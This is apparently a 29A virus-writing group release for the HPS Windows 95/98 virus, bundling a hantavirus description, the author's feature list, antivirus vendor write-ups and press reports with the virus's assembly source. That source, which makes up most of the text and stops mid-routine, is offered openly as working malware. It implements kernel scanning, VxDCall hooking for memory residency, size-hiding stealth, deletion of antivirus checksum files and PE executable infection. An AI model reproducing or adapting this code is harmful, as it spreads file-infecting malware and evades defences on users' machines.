   ;
   ;   Hantavirus Pulmonary Syndrome (HPS) Virus BioCoded by GriYo / 29A
   ;   -----------------------------------------------------------------
   ;
   ;
   ;
   ;
   ;   Index:
   ;   ------
   ;
   ;   1 - About the biological version
   ;   2 - Author's description
   ;   3 - Description from Datafellows
   ;   4 - Description from AVP
   ;   5 - News about HPS from Cable News Network
   ;   6 - News about HPS from InfoWorld Media Group
   ;   7 - HPS source code
   ;
   ;
   ;
   ;
   ;   1 - About the biological version
   ;   --------------------------------
   ;
   ;   The disease  hantavirus pulmonary syndrome (HPS),  is characterized
   ; by an initial  fever followed  by the abrupt onset of acute pulmonary edema
   ; and shock.  After recognition of the initial cases  by observant clinicians
   ; in the Southwest, investigations  were  swiftly mounted by local university
   ; and public health workers but, in spite of efficient and competent studies,
   ; failed to find the cause.  By the time the CDC became involved, a number of
   ; possible  causative  agents  had  been  ruled  out,  leading  most  of  the
   ; investigators  to  believe  they  were  dealing with  a  new  entity.  This
   ; observation  led  to a broadly based approach to the field epidemiology and
   ; the laboratory study of the disease.  Samples from the field investigations
   ; were distributed  among many different  laboratories of the National Center
   ; for  Infectious Disease (NCID) for analysis by  the  most sensitive classic
   ; and  modern  molecular  biological  tests  for  a  wide  range  spectrum of
   ; infectious agents.
   ;
   ; Somewhat   surprisingly,   successful    results   were    obtained   after
   ; only  a  few  days  of  straightforward serologic  tests for  hantaviruses.
   ; The hemoconcentration, thrombocytopenia and shock  observed  in some of the
   ; patients  had raised  speculation  about the  involvement  of  these  viral
   ; agents  however they  had been previously  known  as associated  with renal
   ; syndromes only. The  serologic  results  came from  established  techniques
   ; such   as   indirect   fluorescent-antibody    assays   and   enzyme-linked
   ; immunosorbent assays. The  next  steps utilized reverse  transcription  and
   ; PCR  amplification  of  RNA in postmortem tissue  samples (60% of confirmed
   ; cases to date have been fatal), using  consensus  primers  based  on  known
   ; hantavirus RNA sequences. These yielded  products with sequences typical of
   ; hantavirus but  clearly different  from any known member of the genus. This
   ; provided  additional evidence for  the  hantavirus etiology  and linked the
   ; new hantavirus closely  to the human disease by its presence in the tissues
   ; of people dying  of the infection. Using  the  genomic sequences from human
   ; tissues, investigators were  subsequently able to implicate  the deer mouse
   ; as the principle reservoir of the virus.
   ;
   ; Hantaviruses  have traditionally  been difficult to propagate, and this one
   ; was no exception. Thus  a full-length  cDNA  clone of the small RNA segment
   ; of the virus was synthesized. This technique provided  a diagnostic reagent
   ; of  increased sensitivity that  could be made widely available. Eventually,
   ; full length  RNA  sequences were  developed  for the  medium  segment and a
   ; partial  sequence  was  determined for the  large  segment, permitting  the
   ; definitive  determination  that the new  virus, isolated  weeks  later  and
   ; registered  as  Muerto Canyon virus, was not  a  reassortant  of  any known
   ; hantavirus.
   ;
   ; Immunohistochemical identification  of  hantavirus  antigens  and  in  situ
   ; hybridization   with   genomic  sequences  also  confirmed  the  hantavirus
   ; etiology of the syndrome. The  extensive presence  of  antigen in pulmonary
   ; capillaries provided  an  explanation for the  pathophysiology  and  target
   ; organ  specificity  differing from  that  of  other  known  disease-causing
   ; hantaviruses. This method, when  applied  to paraffin-imbedded tissues, has
   ; also  served as a retrospective diagnostic tool, firmly  identifying  fatal
   ; cases from 10 to 15 years ago.
   ;
   ; The rapid  recognition  of  the  hantavirus etiology  of  this  disease was
   ; important in that  it alleviated heightened fear among the general American
   ; population, and saved lives  by focusing public  health  recommendations on
   ; the avoidance  of  contact  with  potentially  infected  rodents. Different
   ; hantaviruses  have  been  isolated in Louisiana, Florida  and  also Brazil,
   ; indicating  the  uncommon, yet widespread nature of this disease. Recently
   ; (Diglisic 1994), isolation  of  a  hantavirus from Mus musculus captured in
   ; Yugoslavia was reported.
   ;
   ; As stated by C.J. Peters, chief  of  the  Special Pathogens Branch  of  the
   ; Division  of  Viral  and  Rickettsial Diseases at NCID, the crucial role of
   ; modern  techniques  in  virology  was  possible  only in  a context of past
   ; hantavirus research, and as part of efforts of a  multidisciplinary team of
   ; clinicians, epidemiologists, field ecologists  and classic microbiologists.
   ; The need for basic research is highlighted by the applied practical success
   ; which  resulted from it, as was  the  case in identifying  a new  strain of
   ; hantavirus.  Future   research  will  need  to  investigate  the  molecular
   ; mechanisms for induction of  pulmonary  edema and  an  appropriate blocking
   ; therapy. The evolutionary  relationships  of  the  hantaviruses  and  their
   ; rodent  host specificity must be understood to predict the future course of
   ; transmission, and  finally  the basis  for  the  different  tropisms of the
   ; viruses must be examined at a molecular level.
   ;
   ;
   ;
   ;
   ;   2 - Author's description
   ;   ------------------------
   ;
   ;   This virus is a research speciment.  It uses some system hacks that
   ; may not work under futere versions of Windows,  but for the moment it works
   ; nice on Windows95 and Windows98. Some of its characteristics are:
   ;
   ;   2.1. Kernel scanning
   ;
   ;   The virus traps  GP Faults  and scans system memory looking for the
   ; KERNEL32 base address.  After that if gets the address of VxDCall function.
   ; The virus uses no other APIs at all.
   ;
   ;   2.2. Memory resident
   ;
   ;   By means of  VMM PageReserve  and  PageCommit the virus allocates a
   ; block  of  shared  memory  and  copies  its  body  there.   Then  it  hooks
   ; VWIN32_Int21h_Dispatcher so all opened files will be infected.
   ;
   ;   2.3. Stealth
   ;
   ;   HPS  hooks  FindFirst  and  FindNext  functions  in  order  to hide
   ; infected files true size.
   ;
   ;   2.4. Retro
   ;
   ;   Deletes anti-virus checksum databases.
   ;
   ;   2.5. Polymorphic
   ;
   ;   The  virus  uses  complex  polymorphic encryption  engine  to  hide
   ; itself into infected files.   This decryptor will be generated during virus
   ; installation (slow mutation).
   ;
   ;   2.5. Payload
   ;
   ;   On saturdays the virus  will flip  BMP  files  that  are  accessed,
   ; included the ones hidden on .SYS extension (LOGO.SYS, WLOGO.SYS...).
   ;
   ;
   ;
   ;
   ;   3 - Description from Datafellows
   ;   --------------------------------
   ;
   ;   NAME:  HPS
   ;   ALIAS: Hanta, Win95/HPS
   ;   TYPE:  Resident EXE -files
   ;
   ;   HPS is a polymorphic Windows 95 virus which contains this text:
   ;
   ; < Hantavirus Pulmonary Syndrome (HPS) Virus BioCoded by GriYo / 29A >
   ;
   ; HPS  stays active in memory  and  infects  Win32  EXE  files  as  they  are
   ; accessed,  encrypting its  own code  with variable  polymorphic  encryption
   ; layer.
   ;
   ; HPS activates on  Saturdays.  If a non-compressed Windows bitmap (BMP) file
   ; has been opened, the virus horizontally flips the picture.
   ;
   ; HPS patches the  value  DEADBABE (in hex) to the  end of the bitmap  header
   ; area to avoid flipping the same image again.   Since  non-compressed bitmap
   ; files are  frequently  used by Windows 95 and 98, this  causes all kinds of
   ; weird effects - such as the start-up and power-down screen of Windows being
   ; "mirrorized".
   ;
   ;
   ;
   ;
   ;   4 - Description from AVP
   ;   ------------------------
   ;
   ;   This  5124 bytes  virus is  a  Windows95/98  infector that installs
   ; itself  into  the  Windows  kernel,  hooks system events  and  then affects
   ; Portable Executable (PE) files that are accessed. The virus was named after
   ; its "copyright" string that is visible in decrypted virus code:
   ;
   ; < Hantavirus Pulmonary Syndrome (HPS) Virus BioCoded by GriYo / 29A >
   ;
   ; While  infecting a file  the virus increases size of last section, encrypts
   ; its code by  polymorphic engine, writes encrypted result to the end of file
   ; into the last section and modifies the address of entry point.  The size of
   ; polymorphic decryption loop is variable, as a result size of infected files
   ; grows by variable values.
   ;
   ; The virus is slow polymorphic, that means  the polymorphic decryption  loop
   ; code is not changed each time the virus infects a file.  Moreover, the same
   ; infected file will produce  the same polymorphic  code while infecting next
   ; files,  and all files that are infected before rebooting will have the same
   ; decryption routine.  Only  next  "generation"  of  the  virus will  produce
   ; polymorphic loop that differs with "parent" copy of the virus.
   ;
   ; When an infected file is executed, the polymorphic decryption routine takes
   ; control, restores virus  code  in  original form and jumps to  installation
   ; routine.  The virus then scans Windows kernel  code to locate  KERNEL32.DLL
   ; image, looks for  export table in there  and gets  VxDCall  routine address
   ; from there.  The virus then uses this address to call disk access and other
   ; routines in case of need.
   ;
   ; The virus then installs itself into the Windows kernel:  allocates  a block
   ; of memory  by  using  undocumented  Win32  VxD  services  provided  by  VMM
   ; (PageReserve and PageCommit), copies  itself  to there, scans  the  VxDCall
   ; handler in KERNEL32 code and patches it with address of its own handler. As
   ; a  result the  virus installs  itself into the shared memory area and hooks
   ; VxDCall.
   ;
   ; To   prevent  General   Protection   while  scanning   Windows  memory  for
   ; KERNEL32.DLL  image  (that can appear  when the virus  accesses  a part  of
   ; memory that is not available for applications) the virus protects itself by
   ; Structured  Exception  Handling (SEH).   This  also  does  its  work  as  a
   ; anti-debugging trick.
   ;
   ; The virus  detects its  already installed copy by a Are-You-Here?  call  by
   ; GetDate  VxDCall with registers  ESI='HPS!'  and  EDI='TSR?', the installed
   ; copy returns 'YES!' in ESI register.
   ;
   ; The  virus  VxDCall  handler monitors  VWIN32_Int21Dispatch  calls only and
   ; passes through any other calls. There are nine functions intercepted:
   ;
   ; GetDate, Open ReadOnly, Open WriteOnly, FindFirst/Next with LongNames,
   ; Rename with LongName, Create/Open with LongName.
   ;
   ; On file access calls  (open, rename)  the  virus  compares  the  file  name
   ; extension  with EXE, SRC and SYS and infects them, if they are not infected
   ; yet.   After infecting a  file the virus deletes the  anti-virus data files
   ; ANTI-VIR.DAT, CHKLIST.MS, AVP.CRC, IVB.NTZ, if they exist.
   ;
   ;
   ;
   ;
   ;   5 - News about HPS from Cable News Network
   ;   ------------------------------------------
   ;
   ;   SAN FRANCISCO, CALIFORNIA, U.S.A. (NB)
   ;   By Craig Menefee, Newsbytes.
   ;
   ;   Panda  Software, a Spanish  security  software firm  that  recently
   ; entered US  anti-virus markets, claims to have bagged  the first Windows 98
   ; computer  virus before  the new operating  system upgrade has even hit  the
   ; shelves.  Panda  says the  bug's  only apparent purpose is to insert itself
   ; into Windows 98 files, wait until Saturdays and then invert the screen to a
   ; mirror image when it activates.
   ;
   ; Newsbytes notes several  crucial  authenticating  details were missing late
   ; Wednesday, after the firm's European labs were closed for the day.
   ;
   ; Asked  if  the virus is otherwise  damaging, Pedro Bustamante, president of
   ; Panda  Software  USA  in  San Francisco, told  Newsbytes  the  virus  seems
   ; intended more as a nuisance than  a  threat to computer users.  He said the
   ; bug was detected first in Spain and is probably not yet "in the wild," that
   ; is, spread beyond the initial release area.
   ;
   ; Panda says the virus is polymorphic  and  encrypted by a scrambling routine
   ; that changes patterns to elude detection.  When unscrambled, it  carries in
   ; its  code  the letters "HPS".   Panda  says  the letters  are  an  apparent
   ; reference  to Hantavirus Pulmonary Syndrome, a viral disease transmitted by
   ; rodents in the US.  Bustamante says the HPS virus also works on  Windows 95
   ; platforms if  Microsoft Internet Explorer 4.0  is installed on the machine.
   ; Still, he adds, the bug  was  designed  specifically  for  Windows 98,  not
   ; MS Internet Explorer 4.0.  Bustamante  told Newsbytes he  will provide some
   ; further answers on  Thursday after the  Panda Software Virus Lab  opens  in
   ; Spain. Questions to be answered include how the researchers know the bug is
   ; targeted for Windows 98 rather than  Windows 95 or MSIE 4.0  as  a bug that
   ; also happens to work under Windows 98.  Also he said he  would find out how
   ; the virus gets transmitted from one machine to another.
   ;
   ;
   ;
   ;
   ;   6 - News about HPS from InfoWorld Media Group
   ;   ---------------------------------------------
   ;
   ;   June 22, 1998 (Vol. 20, Issue 25)
   ;   Virus in Win98 beats OS shipping date
   ;
   ;   The first  virus specifically written for  Microsoft Windows 98  is
   ; shipping and available before the operating system itself: Windows 98 ships
   ; June 25.
   ;
   ; HPS (Hantavirus Pulmonary Syndrome) is a  32-bit  polymorphic Windows virus
   ; that only  activates when the infected system is booted on a Saturday.  The
   ; Hantavirus Pulmonary Syndrome for which the virus  is named is a biological
   ; disease  transmitted  by  rodents.   Its  principal  symptom  is  an  acute
   ; respiratory crisis. If activated, the computer virus flips any uncompressed
   ; bitmaps horizontally, only on Saturdays.  This produces a  "mirror"  effect
   ; for many of the screens used within the Windows operating system, according
   ; to  Virus Bulletin, the Oxfordshire, England-based  technical  journal that
   ; tracks viruses.
   ;
   ; The virus was authored by GriYo, who is referred to as a "notorious member"
   ; of the 29A virus-writing group, and is  credited  with writing  the complex
   ; Implant virus, according to Virus Bulletin.
   ;
   ; GriYo did make the virus  backward-compatible, though, so  Windows 95 users
   ; need not upgrade to the new OS to experience the same effects.
   ;
   ; Panda Software, based in Spain, has already added protection for this virus
   ; into its anti-virus software.
   ;
   ; According  to a Symantec representative, the company is awaiting its sample
   ; of the virus and said all  anti-virus  companies would be adding protection
   ; for this virus to their libraries shortly.
   ;
   ;
   ;
   ;
   ;   7 - HPS source code
   ;   -------------------
   ;
   ;   Here is the source code of HPS virus. Refer to the article
   ; "The VxDCall Backdoor" for more information.
   ;
   ; And before anything else, its time for some greetings...
   ;
   ; Maia          Smuaaaack!
   ; Jacky Qwerty  Thanks again for your help on this virus
   ; Vecna         Another great coder on our team... good job man
   ; Reptile       Come this summer with the smurfs (and their houses;)
   ; Picard        What about comming with Reptile this summer?
   ; MrSandman     Esperanto was the dream? or you will bring us another one?
   ; DarkMan       Waiting for that 29A domain ;)
   ; Bozo          Justice? What justice?
   ; Mainboard     Hey listen this song! It sounds like the packets in the net!
   ; DarkNail      Is 'Hasimuri' made with poison?
   ; CaseZero      You have to teach me how to do plastic explosives, eh!?
   ; Amanda        Hiya baby!
   ; Armitage      10x for that Linux includes... remember?
   ; Belize        See yah on da'chanel
   ; DeadRose      I want to see you on next #hack meeting!
   ; Akrata        You have to explain again that 'todo=nada' shit ;)
   ; BillSucks     The 'new world order' man
   ; Psico         Eeeeeoooo!!!
   ; Teddy         Kalgan roqs!
   ; Giggler       You reel? :P
   ; Valkie        What about games? Lets code one! Fuxor!
   ; LuisM         Da'B3st Weba-Masta on this side of the galaxy
   ;
   ; Thats all folks, have fun ;)
   ;
   ;  GriYo / 29A
   ;
   ; Im not in the business...
   ; ...I am the business
   ;
   ;
   ;
   ;
   ; -------->8 cut here ---------------------------------------------------------

   ;············································································
   ;
   ;
   ; Hantavirus Pulmonary Syndrome (HPS) Virus BioCoded by GriYo / 29A
   ;
   ;
   ;············································································

                   .386P
                   locals
                   jumps
                   .model flat,STDCALL

                   ;Include the following files

                   include Win32api.inc
                   include Useful.inc
                   include Mz.inc
                   include Pe.inc

                   ;Some externals only used on 1st generation

                   extrn ExitProcess:NEAR
                   extrn MessageBoxA:NEAR

                   ;Virus equates

   mem_size        equ mem_end-mem_base            ;Size of virus in memory
   inf_size        equ inf_end-mem_base            ;Size of virus in files
   base_default    equ 00400000h                   ;Default host base address
   page_mem_size   equ (mem_size+      \           ;Virus in memory
                        inf_size+      \           ;Virus copy for infections
                        poly_max_size+ \           ;Poly decryptor
                        0FFFh)/1000h               ;Size in memory pages
   page_align      equ 10000h                      ;Page allocation alignment
   SIZE_PADDING    equ 00000065h                   ;Mark for infected files

                   ;Some equates stolen from VMM.h

   PR_PRIVATE      EQU     80000400h
   PR_SHARED       EQU     80060000h
   PR_SYSTEM       EQU     80080000h
   PR_FIXED        EQU     00000008h
   PR_4MEG         EQU     00000001h
   PR_STATIC       EQU     00000010h
   PD_ZEROINIT     EQU     00000001h
   PD_NOINIT       EQU     00000002h
   PD_FIXEDZERO    EQU     00000003h
   PD_FIXED        EQU     00000004h
   PC_FIXED        EQU     00000008h
   PC_LOCKED       EQU     00000080h
   PC_LOCKEDIFDP   EQU     00000100h
   PC_WRITEABLE    EQU     00020000h
   PC_USER         EQU     00040000h
   PC_INCR         EQU     40000000h
   PC_PRESENT      EQU     80000000h
   PC_STATIC       EQU     20000000h
   PC_DIRTY        EQU     08000000h
   PCC_ZEROINIT    EQU     00000001h
   PCC_NOLIN       EQU     10000000h

   ;············································································

   _TEXT           segment dword use32 public 'CODE'

   host_entry:     xor ebp,ebp
                   call entry_1st_gen
                   xor eax,eax
                   push eax
                   call ExitProcess

   _TEXT           ends

   ;············································································

   _DATA           segment dword use32 public 'DATA'
   _DATA           ends

   ;············································································

   _BSS            segment dword use32 public 'BSS'
   _BSS            ends

   ;············································································
   ;Virus loader code
   ;············································································

   virseg          segment dword use32 public 'HPS'

   mem_base        equ this byte

   virus_entry:    call get_delta                          ;Get delta-offset
   get_delta:      pop ebp                                 ;into ebp and
                   mov eax,ebp                             ;host original
                   sub ebp,offset get_delta                ;entry-point in eax
                   db 2Dh                                  ;sub eax,xxxx
   infected_ep     dd 00000000h
                   db 05h                                  ;add eax,xxxx
   original_ep     dd 00000000h
                   push eax

   entry_1st_gen:  ;Scan memory looking for KERNEL32.dll
                   ;We can do this without causing protection faults,
                   ;just setup a structured exception handler to trap faults
                   ;produced by our scan
                   ;Thanks to Jacky Qwerty for this piece of code

                   pushad

   try_01:         mov eax,080000101h
                   call IGetK32BaseAddr
                   jecxz try_02
                   jmp kernel_found
   try_02:         mov eax,0C0000101h
                   call IGetK32BaseAddr
                   jecxz try_03
                   jmp kernel_found
   try_03:         xor eax,eax
                   call IGetK32BaseAddr

   kernel_found:   mov dword ptr [esp.Pushad_ebx],ecx
                   popad
                   or ebx,ebx
                   jz init_error
                   mov eax,dword ptr [ebx+IMAGE_DOS_HEADER.MZ_lfanew]
                   add eax,ebx
                   mov edi,dword ptr [eax+NT_OptionalHeader.      \
                                          OH_DirectoryEntries.    \
                                          DE_Export.              \
                                          DD_VirtualAddress]
                   add edi,ebx

                   ;Microsoft C compiler mangles the names of stdcall functions
                   ;(such as VxDCall) to include an @ followed by the number of
                   ;parameter bytes that the function uses
                   ;If you dump out the exports from KERNEL32.dll, you will
                   ;find that the first eight exported entry-points (export
                   ;ordinals 1 through 9) all refer to the same address
                   ;This address is the VxDCall function entry-point
                   ;So lets go to address of exported functions and look for 8
                   ;functions pointing to the same address

                   ;At this time:
                   ;
                   ;ebx = kernel base address
                   ;edi = image export dir

                   mov esi,dword ptr [edi+ED_AddressOfFunctions]
                   add esi,ebx
                   xor edx,edx
   address_loop:   cmp edx,dword ptr [edi+ED_NumberOfFunctions]
                   jae init_error
                   mov ecx,00000008h-01h
   function_loop:  inc edx
                   lodsd
                   cmp eax,dword ptr [esi]
                   jne address_loop
                   loop function_loop

                   add eax,ebx
                   mov dword ptr [ebp+a_VxDCall],eax       ;VxDCall found

                   ;At this point we know how to call VxDCall api
                   ;So we can use our int21h dispatcher to perform
                   ;the residency check

                   mov eax,00002A00h
                   mov esi,"HPS!"
                   mov edi,"TSR?"
                   call my_int21h
                   cmp esi,"YES!"
                   je init_error

                   ;Check if time to activate our payload

                   xor ecx,ecx
                   cmp al,06h                              ;Saturday?
                   jne activation_end
                   inc ecx
   activation_end: mov dword ptr [ebp+bmp_active],ecx

                   ;Well... Now lets use VxDCall to allocate some
                   ;shared memory
                   ;This memory will stay there after host termination
                   ;and will be visible to all running processes

                   push PC_WRITEABLE or PC_USER
                   push page_mem_size                      ;# of pages
                   push PR_SHARED
                   PUSH 00010000h                          ;Call to _PageReserve
                   call dword ptr [ebp+a_VxDCall]          ;VxDCall0
                   cmp eax,0FFFFFFFFh                      ;Success?
                   je init_error
                   cmp eax,80000000h                       ;In shared memory?
                   jb free_pages

                   mov dword ptr [ebp+mem_address],eax     ;Save linnear address

                   push PC_WRITEABLE or PC_USER or PC_PRESENT or PC_FIXED
                   push 00000000h
                   push PD_ZEROINIT
                   push page_mem_size                      ;# of pages
                   shr eax,0Ch                             ;Linnear page number
                   push eax
                   push 00010001h                          ;Call to _PageCommit
                   call dword ptr [ebp+a_VxDCall]          ;VxDCall0
                   or eax,eax
                   je free_pages

   commit_success: mov eax,dword ptr [ebp+mem_address]     ;Point eax to our
                   add eax,VxDCall_code-mem_base           ;hook procedure
                   mov dword ptr [ebp+ptr_location],eax    ;Setup far jmp
                   mov dword ptr [ebp+hook_status],"FREE"  ;Clear busy flag

                   ;Let's trace VxDCall function, code will look like:
                   ;
                   ;VxDCall:
                   ;
                   ;8B 44 24 04           MOV EAX,DWORD PTR [ESP+04h]
                   ;8F 04 24              POP DWORD PTR [ESP]
                   ;2E FF 1D xx xx xx xx  CALL FWORD PTR CS:[xxxxxxxx]
                   ;
                   ;The 32bit far call instruction points to an INT 30h
                   ;instruction used by the VxDCall function to transfer
                   ;control to RING-0

                   mov esi,dword ptr [ebp+a_VxDCall]       ;VxDCall entry-point
                   mov ecx,00000100h                       ;Explore 0100h bytes
   trace_VxDCall:  lodsb
                   cmp al,2Eh
                   jne trace_next
                   cmp word ptr [esi],1DFFh
                   je get_int30h
   trace_next:     loop trace_VxDCall

   free_pages:     xor eax,eax
                   push eax
                   push dword ptr [ebp+mem_address]
                   push 0001000Ah                          ;Call to _PageFree
                   call dword ptr [ebp+a_VxDCall]          ;VxDCall0
                   jmp init_error

   get_int30h:     ;Before setting our hook lets generate one polymorphic
                   ;decryptor... We will use this decryptor for each file
                   ;infection... This is also known as slow-mutation

                   call mutate                             ;Generate decryptor

                   ;Now we have all the necesary information to hook Windows
                   ;calls to VxDCall function
                   ;Save the 16:32 pointer to INT 30h instruction and
                   ;overwrite it with the address of our hook procedure

                   cli
                   lodsw                                   ;Skip FF 1D opcodes
                   lodsd                                   ;Get ptr to INT 30h
                   push eax
                   mov esi,eax
                   mov edi,dword ptr [ebp+mem_address]
                   add edi,VxDCall_code-mem_base
                   mov ecx,00000006h
                   rep movsb
                   pop edi
                   mov eax,dword ptr [ebp+mem_address]
                   add eax,VxDCall_hook-mem_base
                   stosd
                   mov ax,cs                               ;Overwrite far ptr
                   stosw
                   sti

   init_error:     lea ebp,dword ptr [esp+0000013Ch-00000004h]
                   ret

   ;············································································
   ;Find base address of KERNEL32.Dll (code by Jacky Qwerty)
   ;············································································

   SEH_ExcptBlock  macro
                   add esp,-cPushad
                   jnz GK32BA_L1
                   endm

   IGetK32BaseAddr: @SEH_SetupFrame <SEH_ExcptBlock>
                   mov ecx,edx
                   xchg ax,cx
   GK32BA_L0:      dec cx
                   jz GK32BA_L2
                   add eax,-10000h
                   pushad
                   mov bx,-IMAGE_DOS_SIGNATURE
                   add bx,[eax]
                   mov esi,eax
                   jnz GK32BA_L1
                   mov ebx,-IMAGE_NT_SIGNATURE
                   add eax,[esi.MZ_lfanew]
                   mov edx,esi
                   add ebx,[eax]
                   jnz GK32BA_L1
                   add edx,[eax.NT_OptionalHeader.OH_DirectoryEntries  \
                            .DE_Export.DD_VirtualAddress]
                   cld
                   add esi,[edx.ED_Name]
                   lodsd
                   and eax,not 20202020h
                   add eax,-'NREK'
                   jnz GK32BA_L1
                   lodsd
                   or ax,2020h
                   add eax,-'23le'
                   jnz GK32BA_L1
                   lodsb
                   xor ah,al
                   jz GK32BA_L1
                   add al,-'.'
                   lodsd
                   jnz GK32BA_L1
                   and eax,not 202020h
                   add eax,-'LLD'
   GK32BA_L1:      popad
                   jnz GK32BA_L0
                   xchg ecx,eax
                   inc eax
   GK32BA_L2:      @SEH_RemoveFrame
                   ret

                   include excpt.inc

   ;············································································
   ;Hook on Windows VxDCall function
   ;············································································

   VxDCall_hook:   pushad

                   call mem_delta                          ;Get "in-memory"
   mem_delta:      pop ebp                                 ;delta offset
                   sub ebp,offset mem_delta

                   cmp dword ptr [ebp+hook_status],"BUSY"  ;Dont process our
                   je exit_hook                            ;own calls

                   cmp eax,002A0010h                       ;VWIN32 VxD int 21h?
                   jne exit_hook

                   mov eax,dword ptr [esp+0000002Ch]

                   cmp ax,2A00h                            ;Get system time?
                   je tsr_check

                   cmp ax,3D00h                            ;Open file read?
                   je infection_edx

                   cmp ax,3D01h                            ;Open file
                   je infection_edx                        ;read/write?

                   cmp ax,7143h                            ;X-Get/set attrib?
                   je infection_edx

                   cmp ax,714Eh                            ;LFN find first file
                   je stealth

                   cmp ax,714Fh                            ;LFN find next file
                   je stealth

                   cmp ax,7156h                            ;LFN rename file?
                   je infection_edx

                   cmp ax,716Ch                            ;LFN extended open?
                   je infection_esi

                   cmp ax,71A8h                            ;Generate short name?
                   je infection_esi

   exit_hook:      popad

   do_far_jmp:     ;Do a jmp fword ptr cs:[xxxxxxxx] into original code

                   db 2Eh,0FFh,2Dh
   ptr_location    dd 00000000h

   ;············································································
   ;Residency check
   ;············································································

   tsr_check:      cmp esi,"HPS!"                          ;Is our tsr check?
                   jne exit_hook
                   cmp edi,"TSR?"
                   jne exit_hook
                   popad
                   mov esi,"YES!"                          ;Already resident
                   jmp short do_far_jmp

   ;············································································
   ;Stealth
   ;············································································

   stealth:        mov eax,dword ptr [esp+00000028h]       ;Save return address
                   mov dword ptr [ebp+stealth_ret],eax
                   lea eax,dword ptr [ebp+api_ret]         ;Set new ret address
                   mov dword ptr [esp+00000028h],eax

                   mov dword ptr [ebp+find_data],edi       ;Save ptr2FindData

                   jmp exit_hook

   api_ret:        ;As result of the above code we will get control after
                   ;int21h FindFirst or FindNext funcions

                   jc back2caller                          ;Exit if fail

                   pushad                                  ;Save all registers

                   call stealth_delta                      ;Delta offset used
   stealth_delta:  pop ebp                                 ;in stealth routines
                   sub ebp,offset stealth_delta

                   db 0BFh                                 ;mov edi,ptr FindData
   find_data       dd 00000000h

                   xor eax,eax
                   cmp dword ptr [edi+WFD_nFileSizeHigh],eax
                   jne stealth_done

                   mov eax,dword ptr [edi+WFD_nFileSizeLow]
                   mov ecx,SIZE_PADDING
                   xor edx,edx
                   div ecx
                   or edx,edx
                   jnz stealth_done

                   lea esi,dword ptr [edi+WFD_szFileName]  ;Ptr to filename
                   push esi
                   call check_filename
                   pop esi
                   jc stealth_done

                   mov dword ptr [ebp+hook_status],"BUSY"  ;Set busy flag

                   mov eax,0000716Ch                       ;LFN Ext Open/Create
                   xor ebx,ebx                             ;Read
                   xor ecx,ecx                             ;Attribute normal
                   xor edx,edx
                   inc edx                                 ;Open existing
                   call my_int21h
                   jc stealth_done
                   mov ebx,eax

                   mov edx,dword ptr [edi+WFD_nFileSizeLow]
                   sub edx,00000004h
                   call seek_here
                   jc close_stealth

                   mov eax,00003F00h                       ;Read bytes written
                   mov ecx,00000004h
                   lea edx,dword ptr [ebp+stealth_this]
                   call my_int21h
                   jc close_stealth

                   mov eax,dword ptr [ebp+stealth_this]
                   sub dword ptr [edi+WFD_nFileSizeLow],eax

   close_stealth:  mov eax,00003E00h                       ;Close file
                   call my_int21h

   stealth_done:   mov dword ptr [ebp+hook_status],"FREE"  ;Clear busy flag
                   popad                                   ;Save all registers
                   clc                                     ;Return no error

   back2caller:    push eax
                   push eax
                   db 0B8h                                 ;Load eax with the
   stealth_ret     dd 00000000h                            ;return address
                   mov dword ptr [esp+00000004h],eax
                   pop eax
                   ret

   ;············································································
   ;Infection
   ;············································································

   infection_edx:  mov esi,edx

   infection_esi:  mov dword ptr [ebp+hook_status],"BUSY"  ;Set busy flag

                   call check_filename
                   jc exit_infection
                   mov dword ptr [ebp+ptr_filename],edx

                   mov esi,edx
                   xor ecx,ecx
                   cld
   name_checksum:  xor eax,eax
                   lodsb
                   or al,al
                   jz got_checksum
                   add ecx,eax
                   jmp short name_checksum
   got_checksum:   cmp dword ptr [ebp+last_checksum],ecx
                   je exit_infection
                   mov dword ptr [ebp+last_checksum],ecx

                   ;****infection filter
                   ;mov esi,edx
                   ;lodsd
                   ;cmp ax,"XX"
                   ;jne exit_infection

                   mov eax,00007143h                       ;LFN Ext attributes
                   xor ebx,ebx                             ;Retrieve attributes
                   lea edx,dword ptr [ebp+target_filename] ;Ptr to filename
                   call my_int21h
                   jc exit_infection
                   mov dword ptr [ebp+file_attrib],ecx     ;Save original attrib

                   mov eax,00007143h                       ;LFN Ext attributes
                   mov bl,01h                              ;Set file attributes
                   xor ecx,ecx                             ;Clear all attributes
                   lea edx,dword ptr [ebp+target_filename] ;Ptr to filename
                   call my_int21h
                   jc exit_infection

                   mov eax,00007143h                       ;LFN Ext attributes
                   mov bl,04h                              ;Retrieve last w time
                   lea edx,dword ptr [ebp+target_filename] ;Ptr to filename
                   call my_int21h
                   jc exit_infection

                   mov dword ptr [ebp+file_time],ecx       ;Save original time
                   mov dword ptr [ebp+file_date],edi       ;Save original date

                   mov eax,0000716Ch                       ;LFN Ext Open/Create
                   mov ebx,00000002h                       ;Read/Write
                   xor ecx,ecx                             ;Attribute normal
                   mov edx,00000001h                       ;Open existing
                   lea esi,dword ptr [ebp+target_filename] ;Ptr to filename
                   call my_int21h
                   jc exit_infection
                   mov ebx,eax

                   mov eax,00003F00h                       ;Read MsDos header
                   mov ecx,IMAGE_SIZEOF_DOS_HEADER         ;or bitmap file
                   lea edx,dword ptr [ebp+msdos_header]    ;header
                   call my_int21h
                   jc close_file

                   cmp word ptr [ebp+msdos_header],IMAGE_DOS_SIGNATURE
                   je executable

                   ;Here comes the payload code... if it is activated the virus
                   ;will flip horizontally every .BMP file accessed, including
                   ;the ones hidden as .SYS (logow.sys for example ;)

                   ;Payload activated?

                   xor eax,eax
                   cmp dword ptr [ebp+bmp_active],eax
                   je close_file

                   ;Well, now lets try to determine if this file is a BMP file

                   cmp word ptr [ebp+msdos_header],"MB"
                   jne close_file

                   ;Allow only .BMP files using 1 plane and 8 bits per pixel

                   cmp dword ptr [ebp+msdos_header+0000001Ah],00080001h
                   jne close_file

                   ;Skip .BMP files that use compression

                   xor eax,eax
                   cmp dword ptr [ebp+msdos_header+0000001Eh],eax
                   jne close_file

                   ;Check bitmap size in bytes

                   mov eax,dword ptr [ebp+msdos_header+00000012h]
                   mov ecx,dword ptr [ebp+msdos_header+00000016h]
                   mul ecx
                   cmp eax,dword ptr [ebp+msdos_header+00000022h]
                   jne close_file

                   call seek_eof
                   cmp dword ptr [ebp+msdos_header+00000002h],eax
                   jne close_file
                   add eax,00000FFFh
                   xor edx,edx
                   mov ecx,00001000h
                   div ecx
                   mov dword ptr [ebp+bmp_pages],eax

                   push ebx

                   push PC_WRITEABLE or PC_USER
                   push eax                                ;# of pages
                   push PR_SYSTEM
                   PUSH 00010000h                          ;Call to _PageReserve
